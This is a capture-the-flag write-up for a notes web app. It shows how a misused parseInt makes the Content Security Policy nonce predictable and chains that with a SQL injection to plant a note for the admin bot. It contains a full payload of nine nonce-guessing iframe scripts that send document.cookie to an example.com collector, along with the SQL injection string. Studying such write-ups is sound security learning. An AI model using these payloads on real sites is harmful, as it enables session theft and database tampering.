### Private Notes - nonce predictability

The challenge architecture presents a web application that permits the creation of private notes without requiring authentication, incorporating a reporting form designed to submit a uniform resource locator that will subsequently be visited by an administrative bot, with the ultimate flag concealed securely within the cookie of the administrator.

> The note creation functionality permits the insertion of unverified hypertext directly into the page, although achieving a successful injection is not immediate due to the presence of a Content Security Policy that strictly dictates which scripts are permitted execution.

The security header returned by the application is structured exactly as follows:



```HTTP
Content-Security-Policy: script-src 'nonce-RcSMzi4tf73qGvxRx8atJg==';
```

This explicit configuration dictates that a script tag will be permitted execution within this specific document only if it possesses an attribute matching the exact specified cryptographic nonce, requiring an adversary to successfully predict the generated token and embed it within the desired execution payload to bypass the restriction. Upon analyzing the underlying logic responsible for generating the token, a critical structural flaw becomes apparent:



```JavaScript
const random = parseInt(Math.random() * 100000000000000000000000);
res.locals.csp_nonce = crypto
  .createHash("md5")
  .update(`${random}`)
  .digest("base64");
```

The parsing function is utilized incorrectly, as it should properly be applied to transform a string into an integer, whereas applying this function to a massive numeric input results in an unintended sequence of transformations from a number to a string and ultimately back to a number. The random values subjected to this conversion are exceptionally large, causing the execution engine to process the scientific exponential string representation, which inevitably truncates the value exactly at the decimal point, meaning the generated random number overwhelmingly results in an integer strictly between one and nine. Utilizing this specific mathematical insight, an adversary can precalculate the nine possible tags along with their respective tokens to achieve the desired execution state, ensuring the elements are embedded within inline frames to guarantee the browser attempts execution after the hypertext is rendered.



```HTML
<iframe
  srcdoc="<script nonce=xMpCOKC5I4INzFCab3WEmw==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=yB5yjZ1ML2NvBn+JzBSGLA==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=7MvIfktc4v4oMI/Z8qe68w==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=qH/2eaLz5x2RgaZ7dUISLA==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=5No7f7vOI0XXdysGdKMY1Q==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=FnkJHFqID69vteYIfrGy3A==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=jxTkX87qFnpaNt7dS+olQw==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=yfD4lfuYq5FZ9R/QKX4jbQ==>alert(1)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=RcSMzi4tf73qGvxRx8atJg==>alert(1)</script>"
></iframe>
```

Up to this stage in the theoretical analysis, the execution payload remains isolated exclusively to the user who initially created the note, requiring the insertion of a maliciously crafted note under the specific identity of the administrator to trigger the bot, a requirement fulfilled by exploiting a database injection vulnerability located within the backend creation routine.



```JavaScript
await db_get(`INSERT INTO notes (noteid, userid, content) VALUES (${noteid}, ${req.loggedUserId}, '${content}')`)  
```

The content variable is directly controlled by the user, allowing an adversary to manipulate the string sequence to append an entirely new row into the database table, demonstrating how providing a payload such as **aaa'), (1337,1,'payload** forces the creation of a secondary note associated with the provided identifier, rendering it visible exclusively to the targeted user entity.

Knowing that the user identifier assigned to the administrator is exactly zero, the previously described logical steps can be systematically chained to exfiltrate the administrative session token, culminating in the final payload structure presented below.



```HTML
AAA'), (1337,0,'
<iframe
  srcdoc="<script nonce=xMpCOKC5I4INzFCab3WEmw==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=yB5yjZ1ML2NvBn+JzBSGLA==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=7MvIfktc4v4oMI/Z8qe68w==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=qH/2eaLz5x2RgaZ7dUISLA==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=5No7f7vOI0XXdysGdKMY1Q==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=FnkJHFqID69vteYIfrGy3A==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=jxTkX87qFnpaNt7dS+olQw==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=yfD4lfuYq5FZ9R/QKX4jbQ==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
<iframe
  srcdoc="<script nonce=RcSMzi4tf73qGvxRx8atJg==>fetch(`https://example.com/a3e62b3a-7ebb-43d6-a753-2ffe70ab38c1/?`+document.cookie)</script>"
></iframe>
```

To execute the malicious sequence, the adversary must merely submit the specific uniform resource locator, pointing to the injected note at `example-target.com/notes#1337`, to the administrative bot, which subsequently forces the transmission of the session cookie to the controlled external receiver. Finally, because the objective flag is encoded within the token itself, the successful extraction requires decoding the format, a process achievable through standard conversion tools or dedicated web utilities.